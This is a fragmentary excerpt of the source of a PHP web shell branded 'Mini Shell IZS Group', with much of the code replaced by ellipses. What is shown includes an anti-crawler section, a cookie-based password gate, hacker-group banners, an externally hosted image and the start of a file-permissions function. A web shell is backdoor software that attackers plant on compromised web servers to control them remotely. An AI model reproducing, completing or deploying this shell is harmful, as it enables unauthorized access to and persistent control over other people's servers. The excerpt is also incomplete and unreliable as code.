...
/*------------------ End of Anti Crawler -----*/
    ...
    echo "<link href=data:image/gif;https://k.top4top.io/p_3295rywin0.jpg rel=icon type=image/x-icon />";
    echo "<style>
    ...
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        ...
        else
        {
            ...
            echo '<title>Mini Shell IZS Group</title><center>
            ...
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>./Freedom Security X ./Fan Hornet</b></font></th></tr>
...
<title>Mini Shell IZS Group</title>
<style>
body{
font-family: "Iceberg";
...
<center><img src="https://k.top4top.io/p_3295rywin0.jpg" width="500" height="300"></center>
<h1><center><b><font color="red" face="iceberg">-=[ MINI SHELL </font><font color="white" face="iceberg"></font> <font color="white" face="iceberg">IZS GROUP]=-</font></b><br>
			</center></h1>
			<font face="iceberg">
...
echo '<br /><center><font color="white"></font><font color="red">IZS GROUP</font></center>
</BODY>
</HTML>';
function perms($file){
